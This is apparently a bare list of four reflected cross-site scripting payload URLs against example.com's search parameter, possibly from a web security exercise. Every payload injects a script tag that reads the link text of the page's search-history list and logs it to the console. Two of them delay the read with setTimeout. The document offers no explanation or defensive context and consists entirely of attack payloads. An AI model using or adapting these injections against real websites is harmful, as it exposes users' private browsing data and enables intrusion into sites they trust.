http://example.com/search?q=<script>console.log(document.getElementById("history-list").getElementsByTagName('a')[0].innerHTML)</script>



http://example.com/search?q=<script>console.log(document.querySelector('#history-list a').innerHTML)</script>



http://example.com/search?q=<script>setTimeout(

function() {
var array = [];
var links = document.getElementById("history-list").getElementsByTagName('a');
for(var i=0; i<links.length; i++) {
    array.push(links[i].innerHTML);
}
console.log(array)},1000 )</script>



http://example.com/search?q=<script>setTimeout(

function() {
console.log(document.querySelector('#history-list a').innerHTML)
},1000 )</script>